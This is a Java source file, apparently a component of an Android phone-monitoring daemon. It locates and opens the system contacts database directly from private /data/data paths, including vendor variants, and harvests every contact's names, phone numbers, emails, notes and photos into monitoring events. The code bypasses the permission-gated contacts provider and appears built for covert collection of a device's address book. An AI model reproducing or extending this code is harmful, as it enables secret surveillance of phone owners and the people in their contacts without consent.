package com.vvt.processaddressbookmanager.monitor;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Note;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.Photo;
import android.provider.ContactsContract.CommonDataKinds.StructuredName;
import android.provider.ContactsContract.Data;

import com.vvt.base.FxEvent;
import com.vvt.daemon_addressbook_manager.Customization;
import com.vvt.daemon_addressbook_manager.contacts.sync.Contact;
import com.vvt.daemon_addressbook_manager.contacts.sync.EmailContact;
import com.vvt.daemon_addressbook_manager.contacts.sync.PhoneContact;
import com.vvt.events.FxAddressBookEvent;
import com.vvt.ioutil.FileUtil;
import com.vvt.logger.FxLog;
import com.vvt.stringutil.FxStringUtils;


public class AddressBookHelper {
	private static final String TAG = "AddressBookHelper";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String DATABASE_FILE_NAME = "contacts2";
	
	private final static File [] PACKAGE_NAMES  =  {
		new File("/data/data/com.android.providers.contacts/databases/"),
		new File("/dbdata/databases/com.android.providers.contacts/"), // Samgsung Captivate
		new File("/data/data/com.motorola.blur.providers.contacts/databases/"), // Motorola Blur
		new File("/data/data/com.tmobile.myfaves/databases/"),
		new File("/data/data/com.sec.android.provider.logsprovider/databases/"),
	};
	
	private static String sDbPath = null;
	
	public static SQLiteDatabase getReadableDatabase() {
		return openDatabase(SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	public static SQLiteDatabase getWritableDatabase() {
		return openDatabase(SQLiteDatabase.OPEN_READWRITE | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	private static SQLiteDatabase openDatabase(int flags) {
		if(LOGV) FxLog.v(TAG, "openDatabase # START");
		
		if (sDbPath == null) {
			// Find the correct path on this device ..
			StringBuilder foundPath = new StringBuilder();
			boolean isSuccess = FileUtil.findFileInFolders(PACKAGE_NAMES, DATABASE_FILE_NAME, foundPath, "db");
			
			if(LOGD) FxLog.v(TAG, "openDatabase # isSuccess is " + isSuccess);
			if(LOGD) FxLog.v(TAG, "openDatabase # foundPath is " + foundPath);
			
			if(isSuccess) {
				sDbPath = foundPath.toString();
				if(LOGV) FxLog.v(TAG, String.format("openDatabase # sDbPath: %s", sDbPath));
			}
			else {
				if(LOGE) FxLog.e(TAG, "database folder does not exist!");
				return null;
			}
		}

		SQLiteDatabase db = tryOpenDatabase(flags);
		
		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if(LOGV) FxLog.d(TAG, "Cannot open database. Retrying ...");
			try {
				Thread.sleep(1000);
			} 
			catch (InterruptedException e) {
				// Do nothing
			}
			
			db = tryOpenDatabase(flags);
			
			attemptLimit--;
		}
		
		if(LOGV) FxLog.v(TAG, "openDatabase # EXIT");
		return db;
	}
	
	private static SQLiteDatabase tryOpenDatabase(int flags) {
		SQLiteDatabase db = null;
		try {
			
			if(!new File(sDbPath).exists()) {
				FxLog.e(TAG, sDbPath + " does not exist!");
			}
			
			db = SQLiteDatabase.openDatabase(sDbPath, null, flags);
		}
		catch (SQLiteException e) {
			FxLog.e(TAG, e.getMessage(), e);
		}
		return db;
	}
	
	public static ArrayList<Long> getAndroidContactIds(Context context) {
		if(LOGV) FxLog.v(TAG, "# getAndroidContactIds START ..");
		
		ArrayList<Long> ids = new ArrayList<Long>();
		
		SQLiteDatabase db = AddressBookHelper.getReadableDatabase();
		
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if(Customization.ERROR) FxLog.e(TAG, "getAndroidContactIds # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
				return ids;
			}
		}
		 
		Cursor dataCursor =  null;
		
		try {
			dataCursor = db.query(PhoneContacts.CONTACTS_TABLE_NAME, 
					new String[] { ContactsContract.Contacts._ID  }, null, null, null, null, null);
			
			if (dataCursor != null && dataCursor.moveToFirst()) {
				while (dataCursor.isAfterLast() == false) {
					long id = dataCursor.getLong(dataCursor.getColumnIndex(ContactsContract.Contacts._ID));
					if(!ids.contains(id))
						ids.add(id);
					
					dataCursor.moveToNext();
				}
			}
			
		}
		finally {
			if(dataCursor != null)
				dataCursor.close();
			
			if(db != null)
				db.close();
		}
	 	
		if(LOGV) FxLog.v(TAG, "# getAndroidContactIds ids :" + ids);
		if(LOGV) FxLog.v(TAG, "# getAndroidContactIds EXIT ..");
		return ids;
	}

	public static int getAddressBookCount(Context context) {
		if(LOGV) FxLog.v(TAG, "# getAddressBookCount START ..");
		
		SQLiteDatabase db = AddressBookHelper.getReadableDatabase();
		
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if(Customization.ERROR) FxLog.e(TAG, "getAddressBookCount # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
		}
		
		int count = 0;
		Cursor countCursor = null;
		
		try {
			countCursor = db.query(PhoneContacts.CONTACTS_TABLE_NAME, null, null, null, null, null, null);
			
			if (countCursor != null && countCursor.moveToFirst()) {
				count = countCursor.getCount();
			}
		} finally {
			if (countCursor != null)
				countCursor.close();
			
			if(db != null)
				db.close();
		}
		
		if(LOGV) FxLog.v(TAG, "# getAddressBookCount count :" + count);
		if(LOGV) FxLog.v(TAG, "# getAddressBookCount EXIT ..");
		return count;
	}
	
	public static String getLookupKeySelectSql() {
		//if(Customization.VERBOSE) FxLog.v(TAG, "# getLookupKeySelectSql START ..");
		
		String selectedSql = null;
		String afterEclareSql = "SELECT data.raw_contact_id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts.name_raw_contact_id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (contacts.lookup = ?)";
		String beforeEclareSql = "SELECT data.raw_contact_id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts._id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (contacts.lookup = ?)";
		
		if(getSdkInt() <= 7) {
			selectedSql = beforeEclareSql;
		}
		else {
			selectedSql = afterEclareSql;
		}
		
		//if(Customization.VERBOSE) FxLog.v(TAG, "# getLookupKeySelectSql getSdkInt is " + getSdkInt());
		if(LOGV) FxLog.v(TAG, "# getLookupKeySelectSql is " + selectedSql);
		//if(Customization.VERBOSE) FxLog.v(TAG, "# getLookupKeySelectSql EXIT ..");

		return selectedSql;
	}
	
	public static String getIdSelectSql() {
		//if(LOGV) FxLog.v(TAG, "# getIdSelectSql START ..");
		
		String selectedSql = null;

		String afterEclareSql = "SELECT data.raw_contact_id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts.name_raw_contact_id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (data.raw_contact_id = ?)";
		String beforeEclareSql = "SELECT data.raw_contact_id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts._id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (data.raw_contact_id = ?)";
		
		if(getSdkInt() <= 7) {
			selectedSql = beforeEclareSql;
		}
		else {
			selectedSql = afterEclareSql;
		}
		
		//if(LOGV) FxLog.v(TAG, "# getIdSelectSql getSdkInt is " + getSdkInt());
		if(LOGV) FxLog.v(TAG, "# getIdSelectSql is " + selectedSql);
		//if(LOGV) FxLog.v(TAG, "# getIdSelectSql EXIT ..");
		
		return selectedSql;
	}
	
	public static int getSdkInt() {
		if (Build.VERSION.RELEASE.startsWith("1.5"))
			return 3;

		try {
			return getSdkIntInternal();
		} catch (VerifyError e) {
			return 3;
		}
		
		
	}
	private static int getSdkIntInternal() {
		return Build.VERSION.SDK_INT;
	}

 	public static Contact getContactDetailsById(long contactId, Context context) {
 		if(LOGV) FxLog.v(TAG, "# getContactDetailsById START ..");
 		
		Contact contact = new Contact();
		contact.setApprovalState(Contact.PENDING);

		SQLiteDatabase db = AddressBookHelper.getReadableDatabase();
		
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			FxLog.e(TAG, "getContactDetailsById # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
		}
		
		try {
			
			String sql = getIdSelectSql();
			//if(Customization.VERBOSE) FxLog.v(TAG, "# getContactDetailsById # sql " + sql);
			
			Cursor nameCursor = null;

			try {
				nameCursor = db.rawQuery(sql, new String[] { StructuredName.CONTENT_ITEM_TYPE, String.valueOf(contactId) });
				
				// query first name and last name associated with this LookUp Key
				if (nameCursor != null && nameCursor.moveToFirst()) {
					String lookupKey = nameCursor.getString(nameCursor.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
					String givenName = nameCursor.getString(nameCursor.getColumnIndex(StructuredName.GIVEN_NAME));
					String familyName = nameCursor.getString(nameCursor.getColumnIndex(StructuredName.FAMILY_NAME));
					String displayName = nameCursor.getString(nameCursor.getColumnIndex(StructuredName.DISPLAY_NAME));
					
					contact.setUid(lookupKey);
					contact.setId(contactId);
					contact.setDisplayName(FxStringUtils.trimNullToEmptyString(displayName));
					contact.setGivenName(FxStringUtils.trimNullToEmptyString(givenName));
					contact.setFamilyName(FxStringUtils.trimNullToEmptyString(familyName));
				}
			} finally {
				if (nameCursor != null)
					nameCursor.close();
			}
		
			// query phone number that associated with this LookUp Key
			Cursor phoneNumberCursor = null;
						
			
			try {
				phoneNumberCursor = db.rawQuery(sql, new String[] { Phone.CONTENT_ITEM_TYPE, String.valueOf(contactId) });
				
				if (phoneNumberCursor != null && phoneNumberCursor.moveToFirst()) {
		
					while (phoneNumberCursor.isAfterLast() == false) {
						String number = phoneNumberCursor.getString(phoneNumberCursor.getColumnIndex(Phone.NUMBER));
						int type = phoneNumberCursor.getInt(phoneNumberCursor.getColumnIndex(Phone.TYPE));
						
						PhoneContact phone = new PhoneContact();
						phone.setData(FxStringUtils.trimNullToEmptyString(number));
						phone.setType(type);
						contact.addContactMethod(phone);
						
						phoneNumberCursor.moveToNext();
					}
				}
			} finally {
				if (phoneNumberCursor != null)
					phoneNumberCursor.close();
			}
		
			
			
			// 5 query email that associated with this LookUp Key
			Cursor emailCursor = null;
			
			try {
				
				emailCursor = db.rawQuery(sql, new String[] { Email.CONTENT_ITEM_TYPE, String.valueOf(contactId) });
		
				if (emailCursor != null && emailCursor.moveToFirst()) {
					while (emailCursor.isAfterLast() == false) {
						String email = emailCursor.getString(emailCursor.getColumnIndex(Email.DATA));
						int type = emailCursor.getInt(emailCursor.getColumnIndex(Email.TYPE));
		
						EmailContact ec = new EmailContact();
						ec.setData(FxStringUtils.trimNullToEmptyString(email));
						ec.setType(type);
						contact.addContactMethod(ec);
						
						emailCursor.moveToNext();
					}
				}
			} finally {
				if (emailCursor != null)
					emailCursor.close();
			}
		
			
			// 6 query note that associated with this LookUp Key
			Cursor notesCursor = null;
						

			try {
				notesCursor = db.rawQuery(sql, new String[] { Note.CONTENT_ITEM_TYPE, String.valueOf(contactId) });
			
				if (notesCursor != null && notesCursor.moveToFirst()) {
					String note = notesCursor.getString(notesCursor
							.getColumnIndex(Note.NOTE));
					contact.setNote(note);
				}
			}
			finally {
				if (notesCursor != null)
					notesCursor.close();
			}
		
			// 6 query server id that's associated with this LookUp Key
			Cursor dataCursor = null;
		
			try {
				dataCursor = db.rawQuery(sql, new String[] { Data.CONTENT_TYPE, String.valueOf(contactId) });
				
				if (dataCursor != null && dataCursor.moveToFirst()) {
					long serverId = 0;
			
					if (!dataCursor.isNull(dataCursor.getColumnIndex(Data.DATA14))) {
						serverId = dataCursor.getLong(dataCursor.getColumnIndex(Data.DATA14));
					}
					contact.setServerId(serverId);
				}
			}
			finally { 
				if (dataCursor != null)
					dataCursor.close();	
			}
			
			// 7 query contact photo
			Cursor photoCursor = null;
			
			try {
				photoCursor = db.rawQuery(sql, new String[] { Photo.CONTENT_ITEM_TYPE, String.valueOf(contactId) });
				
				if (photoCursor != null && photoCursor.moveToFirst()) {
					byte[] photoData = photoCursor.getBlob(photoCursor.getColumnIndex(Photo.PHOTO));
					contact.setPhoto(photoData);
				}
			}
			finally {
				if (photoCursor != null)
					photoCursor.close();
			}
			
			byte[] vCardData = null; /*getVCardData(contact.getUid(), context);*/
			contact.setVCardData(vCardData);
		}
		finally {
			if(db != null)
				db.close();
		}
		
		if(LOGV) FxLog.v(TAG, "# getContactDetailsById EXIT ..");
		return contact;
	}

	public static ArrayList<FxEvent> getAllContacts(Context context) {
		if(LOGV) FxLog.v(TAG, "getAllContacts # ENTER ..");
		
		ArrayList<FxEvent> addressBookDetails = null;

		ArrayList<String> lookupKeys = PhoneContacts.getLookupKeys();
		if(LOGD) FxLog.d(TAG, "getAllContacts # lookupKeys size " + lookupKeys.size());
		
		addressBookDetails = getContacts(lookupKeys, context);
		
		if(LOGD) FxLog.d(TAG, "getAllContacts # addressBookDetails size " + addressBookDetails.size());
		if(LOGV) FxLog.v(TAG, "getAllContacts # EXIT ..");
		return addressBookDetails;
	}

	private static ArrayList<FxEvent> getContacts(List<String> lookupKeys, Context context) {
		if(LOGV) FxLog.v(TAG, "getContacts # ENTER ..");
		
		ArrayList<FxEvent> addressBookDetails = new ArrayList<FxEvent>();
		SQLiteDatabase db = AddressBookHelper.getReadableDatabase();
		
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if(LOGE) FxLog.e(TAG, "getContacts # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
		}
		
		try {
			for (String lookupKey : lookupKeys) {
				
				FxAddressBookEvent event = new FxAddressBookEvent();
				event.setLookupKey(lookupKey);
				
				// 3 query first name and last name associated with this LookUp Key
				//String sql = "SELECT data.raw_contact_id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts.name_raw_contact_id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (contacts.lookup = ?)";

				String sql = getLookupKeySelectSql();
				//if(Customization.VERBOSE) FxLog.v(TAG, "getContacts # sql :" + sql);
				
				Cursor nameCursor = db.rawQuery(sql, new String[] { StructuredName.CONTENT_ITEM_TYPE, lookupKey });
								
				try {
					if (nameCursor != null && nameCursor.moveToFirst()) {
						long id = nameCursor.getLong(nameCursor.getColumnIndex(Data.RAW_CONTACT_ID));
						String name = nameCursor.getString(nameCursor.getColumnIndex(StructuredName.GIVEN_NAME));
						String lastName = nameCursor.getString(nameCursor.getColumnIndex(StructuredName.FAMILY_NAME));

						event.setEventId(id);
						event.setFirstName(FxStringUtils.trimNullToEmptyString(name));
						event.setLastName(FxStringUtils.trimNullToEmptyString(lastName));
					}
				} finally {
					if (nameCursor != null)
						nameCursor.close();
				}

				// 4 query phone number that associated with this LookUp Key
				Cursor phoneNumberCursor = db.rawQuery(sql, new String[] { Phone.CONTENT_ITEM_TYPE, lookupKey });

				try {
					if (phoneNumberCursor != null
							&& phoneNumberCursor.moveToFirst()) {
						
						while (phoneNumberCursor.isAfterLast() == false) {
							String number = phoneNumberCursor.getString(phoneNumberCursor.getColumnIndex(Phone.NUMBER));
							int type = phoneNumberCursor.getInt(phoneNumberCursor.getColumnIndex(Phone.TYPE));
							
							switch (type) {
							case Phone.TYPE_HOME:
								event.setHomePhone(FxStringUtils.trimNullToEmptyString(number));
								break;
							case Phone.TYPE_MOBILE:
								event.setMobilePhone(FxStringUtils.trimNullToEmptyString(number));
								break;
							case Phone.TYPE_WORK:
								event.setWorkPhone(FxStringUtils.trimNullToEmptyString(number));
								break;
							}
							phoneNumberCursor.moveToNext();
						}
					}
				} finally {
					if (phoneNumberCursor != null)
						phoneNumberCursor.close();
				}

				// 5 query email that associated with this LookUp Key
				Cursor emailCursor = null;
				
				try {
					emailCursor = db.rawQuery(sql, new String[] { Email.CONTENT_ITEM_TYPE, lookupKey });
					
					if (emailCursor != null && emailCursor.moveToFirst()) {
						while (emailCursor.isAfterLast() == false) {
							String email = emailCursor.getString(emailCursor.getColumnIndex(Email.DATA));
							int type = emailCursor.getInt(emailCursor.getColumnIndex(Email.TYPE));
							
							switch (type) {
							case Email.TYPE_HOME:
								event.setHomeEMail(FxStringUtils.trimNullToEmptyString(email));
								break;
							case Email.TYPE_WORK:
								event.setWorkEMail(FxStringUtils.trimNullToEmptyString(email));
								break;
							case Email.TYPE_OTHER:
								event.setOtherEMail(FxStringUtils.trimNullToEmptyString(email));
								break;
							}
							
							emailCursor.moveToNext();
						}
						
					}
				}
				finally {
					if (emailCursor != null)
						emailCursor.close();
				}
				
				 
				// 6 query note that associated with this LookUp Key
				Cursor notesCursor = null;
				
				try {
					notesCursor = db.rawQuery(sql, new String[] { Note.CONTENT_ITEM_TYPE, lookupKey });
					
					if (notesCursor != null && notesCursor.moveToFirst()) {
						String note = notesCursor.getString(notesCursor
								.getColumnIndex(Note.NOTE));
						event.setNote(note);
					}
				}
				finally {
					if (notesCursor != null)
						notesCursor.close();	
				}

				// 6 query server id that's associated with this LookUp Key
				Cursor dataCursor = null;
				
				try {
					dataCursor = db.rawQuery(sql, new String[] { Data.CONTENT_TYPE, lookupKey });
					
					if (dataCursor != null && dataCursor.moveToFirst()) {
						long serverId = 0;

						if (!dataCursor.isNull(dataCursor.getColumnIndex(Data.DATA14))) {
							serverId = dataCursor.getLong(dataCursor.getColumnIndex(Data.DATA14));
						}

						event.setServerId(serverId);
					}
				}
				finally {
					if (dataCursor != null)
						dataCursor.close();
				}
				
 

				// 7 query contact photo
				Cursor photoCursor = null; //
				
				try {
					photoCursor = db.rawQuery(sql, new String[] { Photo.CONTENT_ITEM_TYPE, lookupKey });
					

					if (photoCursor != null && photoCursor.moveToFirst()) {
						byte[] photoData = photoCursor.getBlob(photoCursor.getColumnIndex(Photo.PHOTO));
						event.setContactPicture(photoData);
						photoCursor.close();
					}
				}
				finally {
					if (photoCursor != null)
						photoCursor.close();
				}
				
				
				 
				/*byte[] vCard = getVCardData(lookupKey, context);
				event.setVCardData(vCard);*/

				addressBookDetails.add(event);
			}
		}
		finally {
			if(db != null)
				db.close();
		}
		
		if(LOGD) FxLog.d(TAG, "addressBookDetails Count :" + addressBookDetails.size());
		if(LOGV) FxLog.v(TAG, "getContacts # EXIT ..");
		return addressBookDetails;
	}

	public static byte[] getVCardData(String lookUpKey, Context context) {
		byte[] buffer = null;
		if(LOGV) FxLog.v(TAG, "getVCardData # ENTER ..");
				
		
		try {
			// Create VCard lookup URI
			Uri vcardUri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_VCARD_URI, lookUpKey);

			// Access VCard content data with read-only mode
			AssetFileDescriptor afd = context.getContentResolver().openAssetFileDescriptor(vcardUri, "r");

			// read VCard Data
			if (afd != null) {
				buffer = new byte[(int) afd.getDeclaredLength()];
				FileInputStream fileInputStream = afd.createInputStream();
				fileInputStream.read(buffer);
			}
		} catch (IOException e) {
			FxLog.e(TAG, e.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "getVCardData # EXIT ..");
		return buffer;
	}
}
